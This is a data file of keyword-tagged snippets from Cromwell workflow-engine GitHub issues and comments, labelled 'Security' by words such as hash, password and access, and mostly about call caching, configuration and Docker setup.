Security,"I'm having trouble getting call caching to work with Singularity and SGE, and I'm wondering if anyone has a working example config or some pointers. My config is below, minus passwords and specific paths/urls, which I've replaced with a label encased in <>. I've tried switching to slower hashing strategies finagling with the command construction to no avail. If there's not an obvious solution, is there an easy way to debug this? There are no network issues preventing connections to dockerhub - pulling images and converting to .sif works fine. It's only call caching that's broken. Even when I see, in the metadata, identical hashes for the docker image and all inputs and outputs, I see a ""Cache Miss"" as the result, every time. . The call caching stanza in my metadata looks like this, for example. Am I missing something? ; ```; ""callCaching"": {; ""allowResultReuse"": true,; ""hashes"": {; ""output count"": ""C4CA4238A0B923820DCC509A6F75849B"",; ""runtime attribute"": {; ""docker"": ""4B2AB7B9EA875BF5290210F27BB9654D"",; ""continueOnReturnCode"": ""CFCD208495D565EF66E7DFF9F98764DA"",; ""failOnStderr"": ""68934A3E9455FA72420237EB05902327""; },; ""output expression"": {; ""File output_greeting"": ""DFC652723D8EBD4BB25CAC21431BB6C0""; },; ""input count"": ""CFCD208495D565EF66E7DFF9F98764DA"",; ""backend name"": ""2A2AB400D355AC301859E4ABB5432138"",; ""command template"": ""AFAC58B849BD67585A857F538B8E92F6""; },; ""effectiveCallCachingMode"": ""ReadAndWriteCache"",; ""hit"": false,; ""result"": ""Cache Miss""; },; ```. ```; # simple sge apptainer conf (modified from the slurm one); #; workflow-options; {; workflow-log-dir: ""cromwell-workflow-logs""; workflow-log-temporary: false; workflow-failure-mode: ""ContinueWhilePossible""; default; {; workflow-type: WDL; workflow-type-version: ""draft-2""; }; }. database {; # Store metadata in a file on disk that can grow much larger than RAM limits.; metadata {; profile = ""slick.jdbc.MySQLProfile$""; db {; url = ""jdbc:mysql:<dburl>?rewriteBatchedStatements=true""; driver = ""com.mysql.cj.jdb",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7480:175,password,passwords,175,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7480,3,"['hash', 'password']","['hashes', 'hashing', 'passwords']"
Security,I'm marking this as a `womtool` bug since your examples shouldn't have been passing validation.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4218#issuecomment-428328020:84,validat,validation,84,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4218#issuecomment-428328020,1,['validat'],['validation']
Security,I'm pretty sure if you see this message it means that it wasn't able to get the hash at all,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321823882:80,hash,hash,80,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321823882,1,['hash'],['hash']
Security,"I'm running cromwell 46 with AWS, and having problems with call caching ... 2019-09-30 15:37:20,124 cromwell-system-akka.dispatchers.engine-dispatcher-30 ERROR - Failed to hash ""s3://bdtx-scratch/Andrei/bdtx_dataset_1.00_anno_column_description.txt"": [Attempted 1 time(s)] - S3Exception: null (Service: S3, Status Code: 301, Request ID: null); 2019-09-30 15:37:20,125 cromwell-system-akka.dispatchers.engine-dispatcher-30 ERROR - 66419bab:count_lines.countLines:-1:1: Hash error ([Attempted 1 time(s)] - S3Exception: null (Service: S3, Status Code: 301, Request ID: null)), disabling call caching for this job. call caching settings:; call-caching {; enabled = true; invalidate-bad-cache-results = false; }. Thanks. ###; ### IMPORTANT: Please file new issues over in our Jira issue tracker!; ###; ### https://broadworkbench.atlassian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create issues.; ###. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5204:172,hash,hash,172,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5204,3,"['Hash', 'PASSWORD', 'hash']","['Hash', 'PASSWORDS', 'hash']"
Security,"I'm thinking having more a ""google auth template"" in the conf, with all the auth mode supported by cromwell.; And each section of the conf that needs google authentication (JES genomics, gcs filesystem,...) would provide the auth scheme that it wants to use for this particular feature.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203481252:157,authenticat,authentication,157,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203481252,1,['authenticat'],['authentication']
Security,"I'm thinking perhaps this should be address instead through the use of docker User Namespaces and described in the documentation (a critical part of the solution!). When docker runs a container as root, it isolates the user/groups from the host definitions and instead remaps them. This could be important to a user for two reasons. Once, files written as root in the container will instead be written as this remapped user. Second, since IO on the underlying host VM is currently done as root, the container can read files as root. So if you mounted in /etc/passwd you could read/write on top of that. For a good tutorial see:. E.g. http://blog.aquasec.com/docker-1.10-user-namespace. For more details see:. https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-user-namespace-options. Also pinging @davidbernick for more thoughts from a security perspective",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2053#issuecomment-284430367:854,secur,security,854,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2053#issuecomment-284430367,1,['secur'],['security']
Security,"I'm trying to pass default-runtime-attributes as following:; ```; default-runtime-attributes {; failOnStderr: false; continueOnReturnCode: 0; resource_queue_id: ""q-20230616171245-5j76z""; credential: {; accessKey: ""<secret>"",; secretKey: ""<secret>""; }; }; ```. however, when Cromwell trying to convert the map into womValue, it just turn into BadDefaultAttribute().; ![image](https://github.com/broadinstitute/cromwell/assets/32162780/0030d819-3f94-43a4-bca8-63bca01ff2b5); it seems like the; ```; val value = config.getValue(key).unwrapped(); ```; here it will return a java hashMap, but when it comes to coercion function of WomMapType, It will only works for Scala immutable Map.; ```; case class WomMapType(keyType: WomType, valueType: WomType) extends WomType {; val stableName: String = s""Map[${keyType.stableName}, ${valueType.stableName}]"". override protected def coercion = {; case m: Map[_, _] if m.nonEmpty => WomMap.coerceMap(m, this); case m: util.HashMap[_,_] if !m.isEmpty => WomMap coerceMap(m.asScala.toMap,this)// I add this ; case m: Map[_, _] if m.isEmpty => WomMap(WomMapType(keyType, valueType), Map()); case js: JsObject if js.fields.nonEmpty => WomMap.coerceMap(js.fields, this); case womMap: WomMap => WomMap.coerceMap(womMap.value, this); case o: WomObjectLike => WomMap.coerceMap(o.values, this); }; ```; I add a transformation here and it works. Not sure it's a bug or this is intended",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7174:202,access,accessKey,202,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7174,3,"['Hash', 'access', 'hash']","['HashMap', 'accessKey', 'hashMap']"
Security,"I'm trying to run a WDL file which specifies a Docker container in the runtime attributes of a task. I'm trying to do so on an SGE HPC with a shared file system. Running this with docker is not an option because I don't have root rights/access. Instead, I'm trying to run it using Singularity. This works fine when using a custom runtime attribute to define the container and using the `submit` configuration. However, if the `docker` attribute and `submit-docker` configuration are used I run into a problem:; Cromwell will use `docker_cwd` (instead of `cwd`) in the call's script. `docker_cwd` however does not exist in the container and can therefore not be mounted (due to a lack of sudo rights), like you would normally do when using Docker. The result is that the job will fail because it can't find a folder that is referenced in the script. Is there some way for me to override the `docker_cwd` value in my backend configuration? I would prefer not to use the `submit` configuration, as not all tasks currently list a container, so I need the `submit` configuration for those tasks. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4084:237,access,access,237,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4084,2,"['PASSWORD', 'access']","['PASSWORDS', 'access']"
Security,"I'm with @cjllanwarne in favouring some form of disclaimer on this, wanting as little as you to be or feel actually responsible for others' security!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1653#issuecomment-259256319:140,secur,security,140,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1653#issuecomment-259256319,1,['secur'],['security']
Security,I've been looking into a solution that uses [VPC SC settings](https://cloud.google.com/vpc-service-controls) to restrict bucket egress to specific locations. The gist of it is the owner of the docker image puts the container registry in a project that is within a VPC SC perimeter. The docker image owner will need to configure the perimeter such that only VMs from specific ipRanges can access the bucket/docker image. I've put the details and instructions in [this doc](https://docs.google.com/document/d/1SlmleVb9YOmOEwMOFLDzfPq4EX4Sq1WfTcA4gTnnYx0/edit?usp=sharing) that I've currently shared with the Broad.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-921150372:388,access,access,388,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-921150372,1,['access'],['access']
Security,"I've had a request from @geoffjentry and @mcovarr to convert the ""validation response aggregation"" into a separate actor - see https://docs.google.com/a/broadinstitute.com/document/d/1qTXiPtiJcmfmWghLC_uBeWlL2SuCE2Ek1xBiT0j8-iQ/edit?usp=sharing - I'll rework this PR then re-open",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/688#issuecomment-207589678:66,validat,validation,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/688#issuecomment-207589678,1,['validat'],['validation']
Security,"I've never used Cromwell this way but my understanding is that good call caching performance is heavily dependent on cloud object storage. This is because it returns checksums in a short, constant time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7480#issuecomment-2269738159:166,checksum,checksums,166,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7480#issuecomment-2269738159,1,['checksum'],['checksums']
Security,"I've seen issues before where people struggle to access entries in pairs of pairs. I know we're planning another round of WDL fixup soon. My interim advice would be to begin by extracting the first layer of left and right as separate declarations in the scatter, e.g. ```; scatter(p in pairs); Pair[A,B] lefts = p.left; Pair[C,D] rights = p.right. call x { input: i = lefts.left}; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2334#issuecomment-314076887:49,access,access,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2334#issuecomment-314076887,1,['access'],['access']
Security,"I've worked out what happened, but I don't know if I can resolve this next problem. . I had call-caching turned on for SFS, and this was MD5 hash was being calculated by Cromwell on the login node, however for 2x 100GB BAM files at each step this was (obviously in retrospect) a resource drain. This was only applicable to backends that use the Local Filesystem (GCS and S3 file systems probably use their blob / object id). If you come across this issue, you might have a couple of solutions:; - Turn off call-caching, might not matter to you.; - If you're not using containers, you might be able to get away with the [path+modtime caching strategy](https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options), requires you to use the [`soft-link` copying strategy](https://cromwell.readthedocs.io/en/stable/backends/HPC/#shared-filesystem).; - If you **are** using containers, you're out of luck unfortunately.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4945#issuecomment-507482774:141,hash,hash,141,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4945#issuecomment-507482774,1,['hash'],['hash']
Security,"I/ILLUMINA/C440.TCGA-HU-A4H3-01A-21D-A25D-08.1.bam -> /mnt/loc; al-disk/5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-01A-21D-A25D-08.1.bam (cp failed: gsutil -q -m cp gs://5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga; /STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-01A-21D-A25D-08.1.bam /mnt/local-disk/5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-01A-21D-A25D-08.1.bam,; command failed: Traceback (most recent call last):\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py\"", line 75, in <module>\n main()\n File \""/usr/local/s; hare/google/google-cloud-sdk/bin/bootstrapping/gsutil.py\"", line 22, in main\n project, account = bootstrapping.GetActiveProjectAndAccount()\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/bootstrapping.py\"", line 205, in GetActiveProjectAndAccount\n project_name = properties.VALUES.core.project.Get(validate=False)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1221, in Get\n required)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1501, in _GetProperty\n value = _GetPropertyWithoutDefault(prop, properties_file)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1539, in _GetPropertyWithoutDefault\n value = callback()\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 693, in _GetGCEProject\n return c_gce.Metadata().Project()\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py\"", line 104, in Project\n gce_read.GOOGLE_GCE_METADATA_PROJECT_URI)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/util/retry.py\"", line 155, in TryFunc\n return func(*args, **kwargs), None\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py\"", line 41, in _ReadNoP",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228:6913,validat,validate,6913,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228,1,['validat'],['validate']
Security,"IMO if we put any security recommendations in our README we should be very careful to disclaimer it. **Heavily**. Maybe with something along the lines of:. ```; Warning! ; - Only YOU are responsible for your own security! ; - Cromwell is NOT a security appliance! ; - What follows are ideas and starting points and not necessarily a secure system configuration in your situation""; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1653#issuecomment-259192538:18,secur,security,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1653#issuecomment-259192538,4,['secur'],"['secure', 'security']"
Security,"IMO yes as that's the stated purpose of DOS, to provide access to the **same** file in **different** locations. . Since this level of work is really for the blue box stuff and that's not **quite** the same as DOS yet I'd check with the relevant folks on our side and in particular try to have them to circulate that question among their larger group.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3759#issuecomment-396064853:56,access,access,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3759#issuecomment-396064853,1,['access'],['access']
Security,"IT should be able to get the hash. Anyway, in this case, it's not a big; deal, since this is part of our github testing. On Fri, Aug 11, 2017 at 11:22 AM, Thib <notifications@github.com> wrote:. > It can run the task without having its hash, it just won't try to call; > cache it nor write it to the cache; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321842808>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk4g7uP1uJPFhouOoyfne9aGXQrA8ks5sXHHBgaJpZM4O0GvF>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 8011A; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321869435:29,hash,hash,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321869435,2,['hash'],['hash']
Security,"If `/cromwell-executions/` is referring to the root of your Mac system, I would not expect that to work due to a Mac feature known as [System Integrity Protection](https://support.apple.com/en-us/HT204899). You can test this in isolation by issuing `sudo mkdir /test` which returns `mkdir: /test: Read-only file system` for me (Mac OS 12.2.1). I do not recommend using an escalation to `root` to work around, well, pretty much anything.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1064212178:142,Integrity,Integrity,142,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1064212178,1,['Integrity'],['Integrity']
Security,"If a WDL task generates a file with a space in its name, and that file is an output, Cromwell fumbles the outputs and throws an error (at least on GCP-Terra!Cromwell). Additionally, this doesn't seem to be logged clearly. This workflow takes in a bunch of BioSample accessions, downloads their associated run FASTQs, and processes them. https://dockstore.org/workflows/github.com/aofarrel/myco/myco_sra:4.1.2?tab=files. During one run, I accidentally passed in a file of BioSample accessions which had two spaces before each accession, eg; ```; SAMEA104027315; SAMEA104027345; SAMEA104027406; SAMEA104164787; SAMEA104172469; SAMEA104172474; SAMEA104172508; SAMEA104221066; SAMEA104362398; SAMEA104394395; SAMEA104394505; SAMEA104414628; SAMEA104446901; ```. The workflow is scattered per BioSample, so one instance of the scattered task takes in ` SAMEA104027315` as the input `biosample_accession` (type String). The task writes a file like this:. ```; echo ""~{biosample_accession}"" >> ~{biosample_accession}_pull_results.txt; ```; eg ` SAMEA104027315_pull_results.txt`. The workflow output section contains:. ```; String results = read_string(""~{biosample_accession}_pull_results.txt""); ```. eg ` SAMEA104027315_pull_results.txt`, same as what's in the command section. . In the task level logs, I see . ```; 2023/04/18 21:54:34 Starting delocalization.; 2023/04/18 21:54:35 Delocalization script execution started...; 2023/04/18 21:54:35 Delocalizing output /cromwell_root/memory_retry_rc -> gs://fc-caa84e5a-8ef7-434e-af9c-feaf6366a042/submissions/93bf6971-bfa1-4cb8-bb22-c8a753f58c49/myco/10fa31a8-acbe-4ab7-a96a-6550ec08df12/call-pull/shard-0/memory_retry_rc; 2023/04/18 21:54:37 Delocalizing output /cromwell_root/rc -> gs://fc-caa84e5a-8ef7-434e-af9c-feaf6366a042/submissions/93bf6971-bfa1-4cb8-bb22-c8a753f58c49/myco/10fa31a8-acbe-4ab7-a96a-6550ec08df12/call-pull/shard-0/rc; 2023/04/18 21:54:39 Delocalizing output /cromwell_root/stdout -> gs://fc-caa84e5a-8ef7-434e-af9c-feaf6366a042/submis",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7121:266,access,accessions,266,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7121,3,['access'],"['accession', 'accessions']"
Security,"If a java.util.concurrent.ExecutionException, check if it has an inner cause that is actually fatal.; Pre-update to SBT 1.x.; The cromwell multi-project with SBT 1.x consumes a lot of memory. To avoid OOME:; - Bump IntelliJ from 768 to something like 1786.; - Bump .sbtopts to something like 3072. Build updates while prepping fo sbt version bump, including using sbt-doge temporarily for simplified SBT 0.13 cross version build syntax.; DRYed out a bit of the module dependency graph.; Publish hotfix libraries, not just executables.; Replaced deprecated commons-lang with commons-text replacements.; Fixed test class errantly nested within its companion object.; Fixed test that was only liquibasing metadata, and not the original database.; Removed unused TestActorSystem.; Fixed missing test in ""common"".; Removed old ""common"" sbt files.; Cleaner version of assembly.; SwaggerUI injected into the cromwell-version.conf, so it only needs to be editted in one place.; Replaced usage of 'sbt ""project foo"" sometask' with 'sbt foo/sometask'.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2821:883,inject,injected,883,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2821,1,['inject'],['injected']
Security,"If call cache writing is disabled and a cache miss is known, we could update the various File Hasher actors and tell them not to bother computing no-longer-required file hashes. - [X] Depends on #1307",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1316:94,Hash,Hasher,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1316,2,"['Hash', 'hash']","['Hasher', 'hashes']"
Security,"If it's causing users real grief when they accidentally omit a curly brace and Cromwell hangs forever then I think we should validate that Cromwell now does the Right Thing in that circumstance, and continues to do the Right Thing going forward. Maybe building out that Centaur infrastructure isn't part of this particular ticket, but it seems like something worth doing (especially since I doubt it would be that much effort). ; ; People who actually submit pictures of Gumby deserve whatever they get.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2500#issuecomment-318533390:125,validat,validate,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2500#issuecomment-318533390,1,['validat'],['validate']
Security,"If preemptible is requested, cost is being considered a higher priority; than time. Preempting within 10-20 minutes is not going to rack up much; cost. I could imagine a default cap of 10-20 for the number of early retries. If; the user cares a lot about time, it may be useful to expose it as a; parameter, but this seems less important for the common case. On Wed, Apr 12, 2017 at 2:46 PM, Jeff Gentry <notifications@github.com>; wrote:. > So what if a user actually means they only want to preempt N times no; > matter what? How do we know which the user really means?; >; > Sometimes it's about time, not cost.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2167#issuecomment-293671865>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/AFK12asbeR0RAQpx0AGY7zQuqqlWtUIcks5rvRwTgaJpZM4M70XZ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2167#issuecomment-293678971:281,expose,expose,281,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2167#issuecomment-293678971,1,['expose'],['expose']
Security,"If the command is put into an env var, can the command run in the container be just $MYVAR ?. The process running Cromwell already needs read-only access to the bucket, to get the result code. And the config is already done by CloudFormation or script. I’d prefer one-time config to having to rewrite workflows.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4216#issuecomment-427597353:147,access,access,147,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4216#issuecomment-427597353,1,['access'],['access']
Security,"If the image is not on dockerhub but exists locally where the Cromwell application is running then it should be able to find the hash if `docker.hash-lookup.method = ""local""`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321872886:129,hash,hash,129,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321872886,2,['hash'],"['hash', 'hash-lookup']"
Security,"If this ever does get fixed - the last version that didn't throw `No getWomBundle method implemented in CWL v1` (`31.1`) threw an error for me when I ran on https://github.com/NCI-GDC/gdc-dnaseq-cwl/blob/master/workflows/dnaseq/transform.cwl:. ```; $ java -jar ~/bin/womtool-31.1.jar womgraph transform.cwl; Exception in thread ""main"" scala.MatchError: WomMaybePopulatedFileType (of class wom.types.WomMaybePopulatedFileType$); 	at womtool.graph.WomGraph$.fakeInput(WomGraph.scala:222); 	at womtool.graph.WomGraph$.$anonfun$womExecutableFromCwl$2(WomGraph.scala:205); 	at scala.collection.TraversableLike.$anonfun$map$1(TraversableLike.scala:234); 	at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:231); 	at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:462); 	at scala.collection.TraversableLike.map(TraversableLike.scala:234); 	at scala.collection.TraversableLike.map$(TraversableLike.scala:227); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at womtool.graph.WomGraph$.$anonfun$womExecutableFromCwl$1(WomGraph.scala:205); 	at scala.util.Either.map(Either.scala:350); 	at womtool.graph.WomGraph$.womExecutableFromCwl(WomGraph.scala:201); 	at womtool.graph.WomGraph$.fromFiles(WomGraph.scala:172); 	at womtool.Main$.$anonfun$womGraph$2(Main.scala:98); 	at womtool.Main$.continueIf(Main.scala:102); 	at womtool.Main$.womGraph(Main.scala:96); 	at womtool.Main$.dispatchCommand(Main.scala:38); 	at womtool.Main$.delayedEndpoint$womtool$Main$1(Main.scala:167); 	at womtool.Main$delayedInit$body.apply(Main.scala:12); 	at scala.Function0.apply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mcV$sp$(Function0.scala:34); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); 	at scala.App.$anonfun$main$1$adapted(App.scala:76); 	at scala.collection.immutable.List.foreach(List.scala:389); 	at scala.App.main(App.scala:76); 	at scala.App.main$(App.scala:74); 	at womtool.Main$.main(Main.scala:12); 	at womtool",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4119#issuecomment-584388032:679,Hash,HashMap,679,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4119#issuecomment-584388032,5,['Hash'],"['HashMap', 'HashTrieMap']"
Security,"If you are a Mac user and are also experiencing this issue, you have to compile cromwell from source and change file `backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala` as so: ; ```; - |mkfifo ""$$$out"" ""$$$err""; - |trap 'rm ""$$$out"" ""$$$err""' EXIT; + |touch ""$$$out"" ""$$$err""; |touch $stdoutRedirection $stderrRedirection; - |tee $stdoutRedirection < ""$$$out"" &; - |tee $stderrRedirection < ""$$$err"" >&2 &; ```. This will allow you bypass the `System Integrity Protection` and produce stdout and stderr logs if running local.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1171538706:484,Integrity,Integrity,484,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1171538706,1,['Integrity'],['Integrity']
Security,If you don't want to pull directly develop I can provide the oldest git hash that fixes this bug,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/576#issuecomment-197941787:72,hash,hash,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/576#issuecomment-197941787,1,['hash'],['hash']
Security,"If you use the example in the docs at https://github.com/broadinstitute/cromwell#database. you'll get a warning:. `Move the configuration directly under the 'database' element, and remove the key 'database.config'.`. The docs should be updated. Below is the config given in the readme. database {; config = main.mysql. main {; mysql {; db.url = ""jdbc:mysql://localhost:3306/cromwell""; db.user = ""root""; db.password = """"; db.driver = ""com.mysql.jdbc.Driver""; db.connectionTimeout = 5000 # NOTE: The default 1000ms is often too short for production mysql use; driver = ""slick.driver.MySQLDriver$""; }; }. test {; ...; }; }",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1730:406,password,password,406,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1730,1,['password'],['password']
Security,"Immutable Docker hash request keys to guard against credential mutations breaking lookups, more graceful handling of actual failure cases.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5230:17,hash,hash,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5230,1,['hash'],['hash']
Security,"Implement any necessary logic to calculate hashes. Follow the pattern of the FileHasherActor: The EJHA creates an actor which can make the hash. This actor sends each hash result back to the EngineJobHashingActor individually and lets it do the magic of combining everything together.; - [x] command string (one of the initial hashes in `EJHA`); - [x] all outputs expressions (one of the initial hashes in `EJHA`); - [x] all non-file inputs (included in the set of initial hashes in `EJHA`); - [x] dockerhub/GCR hash (`EngineDockerHashingActor`) or docker name (tuple3 of (namespace, repository, tag, one of the initial hashes in `EJHA`) depending on configuration; - [x] runtime attributes (`BackendRuntimeAttributeHashingActor`); - [x] file inputs (`FileHasherActor`, and onwards to GCS, SFS specific `XYZFileHasherActor`s)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1230:43,hash,hashes,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1230,8,['hash'],"['hash', 'hashes']"
Security,Implement call cache hash reading,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1232:21,hash,hash,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1232,1,['hash'],['hash']
